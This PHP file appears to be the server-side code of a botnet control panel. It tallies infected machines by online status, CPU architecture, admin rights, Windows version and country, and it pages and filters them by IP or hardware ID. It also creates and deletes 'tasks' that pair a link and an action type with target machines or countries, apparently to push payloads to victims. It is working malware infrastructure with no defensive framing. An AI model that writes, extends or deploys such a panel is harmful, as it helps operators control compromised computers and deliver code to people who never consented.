<?php

	function GetCountfOfBots()
	{
		global $PDOConnection;
		return $PDOConnection->query("SELECT COUNT(*) AS `all` FROM `bots`")->fetch(PDO::FETCH_LAZY)[0];
	}
	
	function GetOnlineBots()
	{
		global $PDOConnection;
		return $PDOConnection->query("SELECT COUNT(*) AS `online` FROM `bots` WHERE TIMESTAMPDIFF(MINUTE, `lseen`, now()) < 5")->fetch(PDO::FETCH_LAZY)[0];
	}
	
	function GetDeadBots()
	{
		global $PDOConnection;
		return $PDOConnection->query("SELECT COUNT(*) AS `dead` FROM `bots` WHERE TIMESTAMPDIFF(DAY, `lseen`, now()) > 3")->fetch(PDO::FETCH_LAZY)[0];
	}
	
	function Getx64Bots()
	{
		global $PDOConnection;
		return $PDOConnection->query("SELECT COUNT(*) AS `x64` FROM `bots` WHERE `arch` = 'x64'")->fetch(PDO::FETCH_LAZY)[0];
	}
	
	function GetAdminBots()
	{
		global $PDOConnection;
		return $PDOConnection->query("SELECT COUNT(*) AS `admin` FROM `bots` WHERE `rights` = 'Admin'")->fetch(PDO::FETCH_LAZY)[0];
	}
	
	function GetSimpleStats()
	{
		$i_AllBots = GetCountfOfBots();
		$i_OnlineBots = GetOnlineBots();
		$i_DeadBots = GetDeadBots();
		$i_OfflineBots = $i_AllBots - ($i_OnlineBots + $i_DeadBots);
		$i_x64Bots = Getx64Bots();
		$i_x86Bots = $i_AllBots - $i_x64Bots;
		$i_AdminBots = GetAdminBots();
		$i_UserBots = $i_AllBots - $i_AdminBots;
		
		return [$i_AllBots, $i_OnlineBots, $i_OfflineBots, $i_DeadBots, $i_x64Bots, $i_x86Bots, $i_AdminBots, $i_UserBots];
	}
	
	function GetWindowsStats()
	{
		global $PDOConnection;
		return $PDOConnection->query("SELECT `windows`, COUNT(1) AS `wcount` FROM `bots` GROUP BY `windows` ORDER BY `wcount` DESC")->fetchAll(PDO::FETCH_ASSOC);
	}
	
	function GetCountryStats()
	{
		global $PDOConnection;
		return $PDOConnection->query("SELECT `country`, COUNT(1) AS `ccount` FROM `bots` GROUP BY `country` ORDER BY `ccount` DESC")->fetchAll(PDO::FETCH_ASSOC);
	}
	
	function SetFilterRules()
	{
		if($_GET["filter"])
			return "WHERE `ip` LIKE :pattern OR `hwid` = :pattern OR instr(:pattern, `country`) > 0";
		
		return "";
	}
	
	function GetCountofBots()
	{
		global $PDOConnection;
		$a_Filter = SetFilterRules();
		$pdo_Query = "SELECT COUNT(*) AS `countof` FROM `bots` " . SetFilterRules();
		
		$stmt = $PDOConnection->prepare($pdo_Query);
		$params = [":pattern" => $_GET["filter"]];	
		$stmt->execute($params);	
		
		return $stmt->fetch()[0];
	}
	
	function GetBotList($pageIndex)
	{
		global $PDOConnection;
		$pdo_Query = "SELECT *, CASE WHEN TIMESTAMPDIFF(MINUTE, `lseen`, now()) < 5 THEN \"Online\" WHEN TIMESTAMPDIFF(DAY, `lseen`, now()) > 3 THEN \"Dead\" ELSE \"Offline\" END AS `status` FROM `bots` ".SetFilterRules()." ORDER BY `lseen` DESC LIMIT ".($pageIndex * 25).",25";	
		$stmt = $PDOConnection->prepare($pdo_Query);
		$params = [":pattern" => $_GET["filter"]];	
		$stmt->execute($params);
		
		return $stmt->fetchAll(PDO::FETCH_ASSOC);
	}
	
	function CreateLinks($maxpage,$currentpage,$near,$url)
	{	
		$j = 0;
		$out = "";
		if (($currentpage - $near) < 1) $i = 1; else $i = $currentpage-$near;
		if ($i == 1) $i++;
		if (($maxpage - ($near * 2 + 1)) < $i) $i = $maxpage - ($near * 2 + 1);
		if ($i < 2) $i = 2;
		if ($currentpage != 1) $out .= "<a href=\"{$url}&i=1\">1</a> "; else $out .= "<a class=\"p-selected\">1</a> ";
		if ($i > 2) $out .= "<a>...</a>";
		while ((($i <= ($currentpage+$near)) || ($j < ($near * 2 + 1))) && ($i < $maxpage)){
			if ($i != $currentpage) $out .= "<a href=\"{$url}&i={$i}\">{$i}</a> "; else $out .= "<a class=\"p-selected\">{$i}</a> ";
			$i++;
			$j++;
		}
		if ($i < $maxpage) $out .= "<a>...</a>";
		if ($maxpage > 1){
			if ($maxpage != $currentpage) $out .= "<a href=\"{$url}&i={$maxpage}\">{$maxpage}</a> "; else $out .= "<a class=\"p-selected\">{$maxpage}</a>";
		}	
		return $out;
	}
	
	function GetTaskList()
	{
		global $PDOConnection;
		$pdo_Query = "SELECT * FROM `task`";	
		return $PDOConnection->query($pdo_Query)->fetchAll(PDO::FETCH_ASSOC);
	}
	
	function CreateNewTask($s_Link, $s_Hwid, $s_Limit, $s_Action, $s_Geo)
	{
		if($s_Hwid)
		{
			$s_Limit = 1;
			$s_Geo = "";
		}
		
		global $PDOConnection;
		$pdo_Query = "INSERT INTO `task`(`link`, `hwid`, `limit`, `type`,`country`) VALUES (:link, :hwid, :limit, :type, :geo)";
		$params = [
			":link" => $s_Link,
			":hwid" => $s_Hwid,
			":limit" => $s_Limit,
			":type" => $s_Action,
			":geo" => $s_Geo
		];
		$stmt = $PDOConnection->prepare($pdo_Query);
		$stmt->execute($params);
	}
	
	function DeleteTask($s_Tid)
	{
		global $PDOConnection;
		$pdo_Query = "DELETE FROM `task` WHERE `id` = :id";
		$params = [
			":id" => $s_Tid
		];
		$stmt = $PDOConnection->prepare($pdo_Query);
		$stmt->execute($params);
	}
	
?>